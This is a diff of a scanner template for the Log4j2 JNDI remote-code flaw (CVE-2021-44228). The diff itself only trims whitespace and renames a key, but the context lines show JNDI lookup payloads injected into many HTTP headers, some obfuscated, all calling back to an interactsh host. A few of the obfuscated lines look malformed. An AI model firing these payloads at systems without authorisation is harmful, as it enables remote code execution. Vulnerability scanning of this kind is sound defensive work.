@@ -3,13 +3,13 @@ id: log4j-fuzz-head-poc
 info:
   name: "Apache Log4j2 JNDI features do not protect against attacker controlled LDAP and other JNDI related endpoints"
   description: |
-    Apache Log4j2 2.0-beta9 through 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1) JNDI features 
-    used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other 
-    JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary 
-    code loaded from LDAP servers when message lookup substitution is enabled. 
-    From log4j 2.15.0, this behavior has been disabled by default. 
-    From version 2.16.0 (along with 2.12.2, 2.12.3, and 2.3.1), this functionality has been completely removed. 
-    Note that this vulnerability is specific to log4j-core and does not affect log4net, log4cxx, 
+    Apache Log4j2 2.0-beta9 through 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1) JNDI features
+    used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other
+    JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary
+    code loaded from LDAP servers when message lookup substitution is enabled.
+    From log4j 2.15.0, this behavior has been disabled by default.
+    From version 2.16.0 (along with 2.12.2, 2.12.3, and 2.3.1), this functionality has been completely removed.
+    Note that this vulnerability is specific to log4j-core and does not affect log4net, log4cxx,
     or other Apache Logging Services projects.
   author: xxx,topscoder
   severity: critical
@@ -71,7 +71,7 @@ info:
     cve-id: CVE-2021-44228
   tags: apache,rce,log4j,critical,cve
 
-requests:
+http:
   - raw:
       - |
         GET / HTTP/1.1
@@ -84,7 +84,7 @@ requests:
         {{log4j_payloads}}
     payloads:
       log4j_payloads:
-        
+
         - 'X-Client-IP: ${jndi:ldap://{{interactsh-url}}/info}'
         - 'X-Remote-IP: ${jndi:ldap://{{interactsh-url}}/info}'
         - 'X-Remote-Addr: ${jndi:ldap://{{interactsh-url}}/info}'
@@ -267,7 +267,7 @@ requests:
         - 'Contact: ${${lower:jnd}${upper:i}: ${lower:ldap}://interactsh-url}'
         - 'X-Wap-Profile: ${${lower:jnd}${upper:i}: ${lower:ldap}://interactsh-url}'
         - 'X-Api-Version: ${${lower:jnd}${upper:i}: ${lower:ldap}://interactsh-url}'
-                
+
     attack: clusterbomb
     matchers-condition: or
     matchers:
